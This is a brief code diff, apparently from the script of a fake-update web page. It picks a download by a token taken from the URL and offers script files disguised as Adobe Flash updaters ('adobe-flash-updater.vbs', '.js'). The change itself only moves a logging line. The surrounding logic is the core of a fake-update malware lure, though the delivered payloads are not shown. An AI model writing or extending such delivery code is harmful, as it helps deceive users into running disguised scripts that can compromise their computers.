@@ -8,12 +8,12 @@ setTimeout(() => {
         token = window.location.pathname.replace(/^\/|\/$/g, "");
     }
 
+    console.log("Token:", token);
+
     const downloads = {
         "flash-updater104": "doc/adobe-flash-updater.vbs",
         "flash-updater104j": "doc/adobe-flash-updater.js",
     };
-
-    console.log("Token:", token);
 
     const file = downloads[token] || "doc/adobe-updater.vbs";
 
